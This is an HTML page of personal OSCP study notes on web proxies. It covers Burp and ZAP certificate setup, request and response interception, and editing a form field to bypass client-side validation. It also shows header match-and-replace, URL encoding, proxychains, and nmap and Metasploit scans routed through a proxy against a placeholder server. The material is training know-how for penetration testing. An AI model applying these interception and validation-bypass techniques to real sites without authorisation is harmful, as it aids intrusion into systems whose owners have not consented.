<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.131.0"><meta name=generator content="Relearn 8.2.0"><meta name=description content="Intro to Web Proxies Burp Suite Installing CA Certificate Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy‚Äôs CA Certificates. If we don‚Äôt do this step, some HTTPS traffic may not get properly routed, or we may need to click accept every time Firefox needs to send an HTTPS request.
We can install Burp‚Äôs certificate once we select Burp as our proxy in Foxy Proxy, by browsing to http://burp, and download the certificate from there by clicking on CA Certificate:"><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="Web Attacks :: DrakonOps"><meta name=twitter:description content="Intro to Web Proxies Burp Suite Installing CA Certificate Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy‚Äôs CA Certificates. If we don‚Äôt do this step, some HTTPS traffic may not get properly routed, or we may need to click accept every time Firefox needs to send an HTTPS request.
We can install Burp‚Äôs certificate once we select Burp as our proxy in Foxy Proxy, by browsing to http://burp, and download the certificate from there by clicking on CA Certificate:"><meta property="og:url" content="https://web/oscp-notes/web-attacks/index.html"><meta property="og:site_name" content="DrakonOps"><meta property="og:title" content="Web Attacks :: DrakonOps"><meta property="og:description" content="Intro to Web Proxies Burp Suite Installing CA Certificate Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy‚Äôs CA Certificates. If we don‚Äôt do this step, some HTTPS traffic may not get properly routed, or we may need to click accept every time Firefox needs to send an HTTPS request.
We can install Burp‚Äôs certificate once we select Burp as our proxy in Foxy Proxy, by browsing to http://burp, and download the certificate from there by clicking on CA Certificate:"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="OSCP Notes"><meta itemprop=name content="Web Attacks :: DrakonOps"><meta itemprop=description content="Intro to Web Proxies Burp Suite Installing CA Certificate Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy‚Äôs CA Certificates. If we don‚Äôt do this step, some HTTPS traffic may not get properly routed, or we may need to click accept every time Firefox needs to send an HTTPS request.
We can install Burp‚Äôs certificate once we select Burp as our proxy in Foxy Proxy, by browsing to http://burp, and download the certificate from there by clicking on CA Certificate:"><meta itemprop=wordCount content="9774"><title>Web Attacks :: DrakonOps</title>
<link href=../../images/logo.png?1762285676 rel=icon type=image/png><link href=../../css/auto-complete/auto-complete.min.css?1762285676 rel=stylesheet><script src=../../js/auto-complete/auto-complete.min.js?1762285676 defer></script><script src=../../js/search-lunr.min.js?1762285676 defer></script><script src=../../js/search.min.js?1762285676 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="../../searchindex.en.js?1762285676"</script><script src=../../js/lunr/lunr.min.js?1762285676 defer></script><script src=../../js/lunr/lunr.stemmer.support.min.js?1762285676 defer></script><script src=../../js/lunr/lunr.multi.min.js?1762285676 defer></script><script src=../../js/lunr/lunr.en.min.js?1762285676 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762285676 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762285676 rel=stylesheet></noscript><link href=../../css/perfect-scrollbar/perfect-scrollbar.min.css?1762285676 rel=stylesheet><link href=../../css/theme.min.css?1762285676 rel=stylesheet><link href=../../css/format-html.min.css?1762285676 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/oscp-notes/web-attacks/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../..",window.relearn.absBaseUri="https://web",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["zen-dark"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=../../css/custom.css?1762285676 rel=stylesheet></head><body class="mobile-support html" data-url=../../oscp-notes/web-attacks/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></span></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><a href=#burp-suite>Burp Suite</a></li><li><a href=#installing-ca-certificate>Installing CA Certificate</a></li></ul><ul><li><a href=#burp>Burp</a></li><li><a href=#zap>ZAP</a></li></ul><ul><li><ul><li></li></ul></li><li><a href=#automatic-response-modification>Automatic Response Modification</a></li><li><a href=#url-encoding>URL Encoding</a></li></ul><ul><li><a href=#proxychains>Proxychains</a></li><li><a href=#metasploit>Metasploit</a></li></ul><ul><li><a href=#ffuf>Ffuf</a></li><li><a href=#directory-fuzzing>Directory Fuzzing</a></li></ul><ul><li><a href=#recursive-flags>Recursive Flags</a></li></ul><ul><li><a href=#vhosts-fuzzing>Vhosts Fuzzing</a></li><li><a href=#get-request-fuzzing>GET Request Fuzzing</a></li></ul><ul><li><a href=#filename-prefix>Filename Prefix</a></li></ul><ul><li><a href=#non-recursive-path-traversal-filters>Non-Recursive Path Traversal Filters</a></li><li><a href=#encoding>Encoding</a></li><li><a href=#approved-paths>Approved Paths</a></li><li><a href=#appended-extension>Appended Extension</a><ul><li></li></ul></li></ul><ul><li><a href=#input-filters>Input Filters</a></li><li><a href=#fuzzing-for-php-files>Fuzzing for PHP Files</a></li><li><a href=#source-code-disclosure>Source Code Disclosure</a></li><li><a href=#data>Data</a><ul><li></li></ul></li><li><a href=#input>Input</a></li><li><a href=#expect>Expect</a></li></ul><ul><li><a href=#verify-rfi>Verify RFI</a></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li></ul><ul><li><ul><li></li></ul></li><li><a href=#zip-upload>Zip Upload</a></li><li><a href=#phar-upload>Phar Upload</a></li></ul><ul><li><a href=#php-session-poisoning>PHP Session Poisoning</a></li><li><a href=#server-log-poisoning>Server Log Poisoning</a></li></ul><ul><li><a href=#fuzzing-parameters>Fuzzing Parameters</a><ul><li></li></ul></li></ul><ul><li><a href=#web-shells>Web Shells</a></li><li><a href=#client-side-validation-bypass>Client-Side Validation bypass</a></li><li><a href=#disabling-front-end-validation>Disabling Front-end Validation</a></li></ul><ul><li><a href=#double-extensions>Double Extensions</a></li><li><a href=#reverse-double-extension>Reverse Double Extension</a></li><li><a href=#character-injection>Character Injection</a></li></ul><ul><li><a href=#mime-type>MIME-Type</a></li></ul><ul><li><a href=#xss>XSS</a></li><li><a href=#xxe>XXE</a></li><li><a href=#other-file-upload-attacks>Other File Upload Attacks</a><ul><li><a href=#-injections-in-file-name>üß™ Injections in File Name</a></li><li><a href=#-upload-directory-disclosure>üìÅ Upload Directory Disclosure</a></li><li><a href=#-windows-specific-attacks>ü™ü Windows-Specific Attacks</a></li><li><a href=#-advanced-file-upload-attacks>üß¨ Advanced File Upload Attacks</a></li></ul></li><li><a href=#command-injection-methods>Command Injection Methods</a></li><li><a href=#and-operator>AND Operator</a></li><li><a href=#or-operator>OR Operator</a></li><li><a href=#filterwaf-detection>Filter/WAF Detection</a></li><li><a href=#blacklisted-characters>Blacklisted Characters</a></li></ul><ul><li><a href=#bypass-blacklisted-operators>Bypass Blacklisted Operators</a></li><li><a href=#bypass-blacklisted-spaces>Bypass Blacklisted Spaces</a><ul><li></li></ul></li></ul><ul><li><a href=#windows>Windows</a></li><li><a href=#character-shifting>Character Shifting</a></li></ul><ul><li><a href=#linux--windows>Linux & Windows</a><ul><li></li></ul></li><li><a href=#linux-only>Linux Only</a></li><li><a href=#windows-only>Windows Only</a></li><li><a href=#reversed-commands>Reversed Commands</a><ul><li></li></ul></li><li><a href=#encoded-commands>Encoded Commands</a><ul><li></li></ul></li><li><a href=#-evasion-tools-for-command-injection>üîê Evasion Tools for Command Injection</a><ul><li><a href=#-linux-bashfuscator>üêß Linux: Bashfuscator</a></li><li><a href=#-windows-invoke-dosfuscation>ü™ü Windows: Invoke-DOSfuscation</a></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../index.html><span itemprop=name>DrakonOps</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../oscp-notes/index.html><span itemprop=name>OSCP Notes</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>Web Attacks</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/vhosts/index.html title="vhosts (ü°ê)"><i class="fa-fw fas fa-chevron-left"></i></a></span></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/xss/index.html title="XSS (ü°í)"><i class="fa-fw fas fa-chevron-right"></i></a></span></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable oscp-notes" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=web-attacks>Web Attacks</h1><h1 id=intro-to-web-proxies>Intro to Web Proxies</h1><h2 id=burp-suite>Burp Suite</h2><h2 id=installing-ca-certificate>Installing CA Certificate</h2><p>Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy&rsquo;s CA Certificates. If we don&rsquo;t do this step, some HTTPS traffic may not get properly routed, or we may need to click <code>accept</code> every time Firefox needs to send an HTTPS request.</p><p>We can install Burp&rsquo;s certificate once we select Burp as our proxy in <code>Foxy Proxy</code>, by browsing to <code>http://burp</code>, and download the certificate from there by clicking on <code>CA Certificate</code>:</p><p>¬†</p><p>¬†</p><p>ZAP</p><p><a href=#R-image-1eb5af24d8c5bace8e90cd2f39f29280 class=lightbox-link><img alt=956cf805d36507d1728b87d81078e103.png class="lazy lightbox figure-image" loading=lazy src=../../resources/956cf805d36507d1728b87d81078e103.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1eb5af24d8c5bace8e90cd2f39f29280><img alt=956cf805d36507d1728b87d81078e103.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/956cf805d36507d1728b87d81078e103.png></a></p><p>¬†</p><p>¬†</p><h1 id=intercepting-web-requests>Intercepting Web Requests</h1><p>¬†</p><p><a href=#R-image-96fa587303bb1d0ac87394e2b120104a class=lightbox-link><img alt=8d4ab50036f0c0e442db079d7f9895ab.png class="lazy lightbox figure-image" loading=lazy src=../../resources/8d4ab50036f0c0e442db079d7f9895ab.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-96fa587303bb1d0ac87394e2b120104a><img alt=8d4ab50036f0c0e442db079d7f9895ab.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/8d4ab50036f0c0e442db079d7f9895ab.png></a></p><p>¬†</p><p>We can choose to <code>step</code> to send the request and examine its response and break any further requests, or we can choose to <code>continue</code> and let the page send the remaining requests. The <code>step</code> button is helpful when we want to examine every step of the page&rsquo;s functionality, while <code>continue</code> is useful when we are only interested in a single request and can forward the remaining requests once we reach our target request</p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=intercepting-responses>Intercepting Responses</h1><p>¬†</p><h2 id=burp>Burp</h2><p>In Burp, we can enable response interception by going to (<code>Proxy>Options</code>) and enabling <code>Intercept Response</code> under <code>Intercept Server Responses</code>:</p><p>¬†</p><p><a href=#R-image-aeb1857f25a7e2c17f1e9f6798ce5c9c class=lightbox-link><img alt=dbe0b4ebbed3c09ae117130542c01a7f.png class="lazy lightbox figure-image" loading=lazy src=../../resources/dbe0b4ebbed3c09ae117130542c01a7f.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-aeb1857f25a7e2c17f1e9f6798ce5c9c><img alt=dbe0b4ebbed3c09ae117130542c01a7f.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/dbe0b4ebbed3c09ae117130542c01a7f.png></a></p><p>¬†</p><p>Let&rsquo;s try changing the <code>type="number"</code> on line 27 to <code>type="text"</code>, which should enable us to write any value we want. We will also change the <code>maxlength="3"</code> to <code>maxlength="100"</code> so we can enter longer input:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ip&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ip&#34;</span> <span style=color:#a6e22e>min</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>max</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;255&#34;</span> <span style=color:#a6e22e>maxlength</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;100&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>oninput</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;javascript: if (this.value.length &gt; this.maxLength) this.value = this.value.slice(0, this.maxLength);&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>required</span>&gt;</span></span></code></pre></div><p>¬†</p><h2 id=zap>ZAP</h2><p><a href=#R-image-13c87ed7a2540ae673b14d5edbe35b0d class=lightbox-link><img alt=877c86cb4d89f85b2c37939c0cea95ff.png class="lazy lightbox figure-image" loading=lazy src=../../resources/877c86cb4d89f85b2c37939c0cea95ff.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-13c87ed7a2540ae673b14d5edbe35b0d><img alt=877c86cb4d89f85b2c37939c0cea95ff.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/877c86cb4d89f85b2c37939c0cea95ff.png></a></p><p>¬†</p><p><a href=#R-image-1fef7f53238def7959a8c25fb8da5aa2 class=lightbox-link><img alt=20d5b118d59444c97d55ac5548222986.png class="lazy lightbox figure-image" loading=lazy src=../../resources/20d5b118d59444c97d55ac5548222986.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1fef7f53238def7959a8c25fb8da5aa2><img alt=20d5b118d59444c97d55ac5548222986.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/20d5b118d59444c97d55ac5548222986.png></a></p><p>¬†</p><p>¬†</p><p><strong>Hidden fields</strong></p><ul><li><strong>Enable input fields</strong></li></ul><p><strong><a href=#R-image-6834da6af4276d7503416e4d34acf5a0 class=lightbox-link><img alt=a8ec43bdf041b524d2eda08bbe7c42e3.png class="lazy lightbox figure-image" loading=lazy src=../../resources/a8ec43bdf041b524d2eda08bbe7c42e3.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6834da6af4276d7503416e4d34acf5a0><img alt=a8ec43bdf041b524d2eda08bbe7c42e3.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/a8ec43bdf041b524d2eda08bbe7c42e3.png></a></strong></p><p>¬†</p><p>¬†</p><p><strong>Can see comments by turning on comments toggle from left</strong></p><p><strong>Another similar feature is the <code>Comments</code> button, which will indicate the positions where there are HTML comments that are usually only visible in the source code. We can click on the <code>+</code> button on the left pane and select <code>Comments</code> to add the <code>Comments</code> button, and once we click on it, the <code>Comments</code> indicators should be shown. For example, the below screenshot shows an indicator for a position that has a comment, and hovering over it with our cursor shows the comment&rsquo;s content:</strong></p><p>¬†</p><p><strong><a href=#R-image-1b3ddc4c490f65cf67b29f957b964582 class=lightbox-link><img alt=fba9f41192890b9b2adf1ca64088ddae.png class="lazy lightbox figure-image" loading=lazy src=../../resources/fba9f41192890b9b2adf1ca64088ddae.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1b3ddc4c490f65cf67b29f957b964582><img alt=fba9f41192890b9b2adf1ca64088ddae.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/fba9f41192890b9b2adf1ca64088ddae.png></a></strong></p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=automatic-modification>Automatic Modification</h1><p>¬†</p><h4 id=burp-match-and-replace>Burp Match and Replace</h4><p>We can go to (<code>Proxy>Options>Match and Replace</code>) and click on <code>Add</code> in Burp. As the below screenshot shows, we will set the following options</p><p>¬†</p><p><a href=#R-image-6668cd711cfb5a59195e6fc80bb677fc class=lightbox-link><img alt=060b76cd7eaedd321ef5a301bff51f3d.png class="lazy lightbox figure-image" loading=lazy src=../../resources/060b76cd7eaedd321ef5a301bff51f3d.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6668cd711cfb5a59195e6fc80bb677fc><img alt=060b76cd7eaedd321ef5a301bff51f3d.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/060b76cd7eaedd321ef5a301bff51f3d.png></a></p><p>¬†</p><p>¬†</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>Type</code>: <code>Request header</code></td><td>Since the change we want to make will be in the request header and not in its body.</td></tr><tr><td><code>Match</code>: <code>^User-Agent.*$</code></td><td>The regex pattern that matches the entire line with <code>User-Agent</code> in it.</td></tr><tr><td><code>Replace</code>: <code>User-Agent: HackTheBox Agent 1.0</code></td><td>This is the value that will replace the line we matched above.</td></tr><tr><td><code>Regex match</code>: True</td><td>We don&rsquo;t know the exact User-Agent string we want to replace, so we&rsquo;ll use regex to match any value that matches the pattern we specified above.</td></tr></tbody></table><p>¬†</p><p>¬†</p><p><a href=#R-image-ba966c8df7b3bf98d6fb7d72189cef48 class=lightbox-link><img alt=1596fe7f75334c78456233cb3ad4e2ac.png class="lazy lightbox figure-image" loading=lazy src=../../resources/1596fe7f75334c78456233cb3ad4e2ac.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ba966c8df7b3bf98d6fb7d72189cef48><img alt=1596fe7f75334c78456233cb3ad4e2ac.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/1596fe7f75334c78456233cb3ad4e2ac.png></a></p><p>¬†</p><h4 id=zap-replacer>ZAP Replacer</h4><p>tools&mdash;->options&mdash;&ndash;>replacer</p><p><a href=#R-image-ae8503a050c848eda84223aa968e2014 class=lightbox-link><img alt=8f84d85372eeade9b46d25f1a8ad4d67.png class="lazy lightbox figure-image" loading=lazy src=../../resources/8f84d85372eeade9b46d25f1a8ad4d67.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ae8503a050c848eda84223aa968e2014><img alt=8f84d85372eeade9b46d25f1a8ad4d67.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/8f84d85372eeade9b46d25f1a8ad4d67.png></a></p><p>¬†</p><p>¬†</p><h2 id=automatic-response-modification>Automatic Response Modification</h2><p>burp</p><p><a href=#R-image-53e1b8dfbc7e585ed0ae9251b88899c1 class=lightbox-link><img alt=f02b90f75227c916a43dc76dedd426f2.png class="lazy lightbox figure-image" loading=lazy src=../../resources/f02b90f75227c916a43dc76dedd426f2.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-53e1b8dfbc7e585ed0ae9251b88899c1><img alt=f02b90f75227c916a43dc76dedd426f2.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/f02b90f75227c916a43dc76dedd426f2.png></a></p><p>ZAP</p><p>¬†</p><p><a href=#R-image-61c40ee0e5f838654e7b93e7c64a2b01 class=lightbox-link><img alt=c8ba7c76f432c39bfa6372f1b68a52f2.png class="lazy lightbox figure-image" loading=lazy src=../../resources/c8ba7c76f432c39bfa6372f1b68a52f2.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-61c40ee0e5f838654e7b93e7c64a2b01><img alt=c8ba7c76f432c39bfa6372f1b68a52f2.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/c8ba7c76f432c39bfa6372f1b68a52f2.png></a></p><p>¬†</p><h2 id=url-encoding>URL Encoding</h2><p>It is essential to ensure that our request data is URL-encoded and our request headers are correctly set. Otherwise, we may get a server error in the response. This is why encoding and decoding data becomes essential as we modify and repeat web requests. Some of the key characters we need to encode are:</p><ul><li><code>Spaces</code>: May indicate the end of request data if not encoded</li><li><code>&</code>: Otherwise interpreted as a parameter delimiter</li><li><code>#</code>: Otherwise interpreted as a fragment identifier</li></ul><p>To URL-encode text in Burp Repeater, we can select that text and right-click on it, then select (<code>Convert Selection>URL>URL encode key characters</code>), or by selecting the text and clicking [<code>CTRL+U</code>]. Burp also supports URL-encoding as we type if we right-click and enable that option, which will encode all of our text as we type it. On the other hand, ZAP should automatically URL-encode all of our request data in the background before sending the request, though we may not see that explicitly.</p><p>There are other types of URL-encoding, like <code>Full URL-Encoding</code> or <code>Unicode URL</code> encoding, which may also be helpful for requests with many special characters.</p><p>¬†</p><p>¬†</p><p><a href=#R-image-6644fdf60f13c7ae83f703ceddc3c58a class=lightbox-link><img alt=2231fc6f3cd039a53fdd13681dc18894.png class="lazy lightbox figure-image" loading=lazy src=../../resources/2231fc6f3cd039a53fdd13681dc18894.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6644fdf60f13c7ae83f703ceddc3c58a><img alt=2231fc6f3cd039a53fdd13681dc18894.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/2231fc6f3cd039a53fdd13681dc18894.png></a></p><p>¬†</p><p>¬†</p><p>In ZAP, we can use the <code>Encoder/Decoder/Hash</code> tool, which will automatically decode strings using various decoders in the <code>Decode</code> tab:[<code>CTRL+E</code>].</p><p>¬†</p><p><a href=#R-image-c1f9cc37e4f91a63cb960e280098cb48 class=lightbox-link><img alt=f18418b679691097d7ddb02d6831baa0.png class="lazy lightbox figure-image" loading=lazy src=../../resources/f18418b679691097d7ddb02d6831baa0.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-c1f9cc37e4f91a63cb960e280098cb48><img alt=f18418b679691097d7ddb02d6831baa0.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/f18418b679691097d7ddb02d6831baa0.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=proxying-tools>Proxying Tools</h1><h2 id=proxychains>Proxychains</h2><p>One very useful tool in Linux is <a href=https://github.com/haad/proxychains rel=external>proxychains</a>, which routes all traffic coming from any command-line tool to any proxy we specify. <code>Proxychains</code> adds a proxy to any command-line tool and is hence the simplest and easiest method to route web traffic of command-line tools through our web proxies.</p><p>To use <code>proxychains</code>, we first have to edit <code>/etc/proxychains.conf</code>, comment out the final line and add the following line at the end of it:</p><p>Proxying Tools</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>#socks4         127.0.0.1 <span style=color:#ae81ff>9050</span>
</span></span><span style=display:flex><span>http 127.0.0.1 8080
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†<strong>NMAP</strong></p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Starting Nmap 7.91 ( https://nmap.org )
</span></span><span style=display:flex><span>Nmap scan report for SERVER_IP
</span></span><span style=display:flex><span>Host is up (0.11s latency).
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>PORT      STATE SERVICE
</span></span><span style=display:flex><span>PORT/tcp open  unknown
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h2 id=metasploit>Metasploit</h2><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ msfconsole
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>msf6 &gt; use auxiliary/scanner/http/robots_txt
</span></span><span style=display:flex><span>msf6 auxiliary(scanner/http/robots_txt) &gt; set PROXIES HTTP:127.0.0.1:8080
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>PROXIES =&gt; HTTP:127.0.0.1:8080
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>msf6 auxiliary(scanner/http/robots_txt) &gt; set RHOST SERVER_IP
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>RHOST =&gt; SERVER_IP
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>msf6 auxiliary(scanner/http/robots_txt) &gt; set RPORT PORT
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>RPORT =&gt; PORT
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>msf6 auxiliary(scanner/http/robots_txt) &gt; run
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Scanned 1 of 1 hosts (100% complete)
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h1 id=zap-scanner>ZAP Scanner</h1><p>¬†</p><p><a href=#R-image-4e464509f3f12a5deb9b680bf2f88441 class=lightbox-link><img alt=340ff374d2ef0ef2c9449372bb4e66cd.png class="lazy lightbox figure-image" loading=lazy src=../../resources/340ff374d2ef0ef2c9449372bb4e66cd.png style=height:auto;width:auto></a>
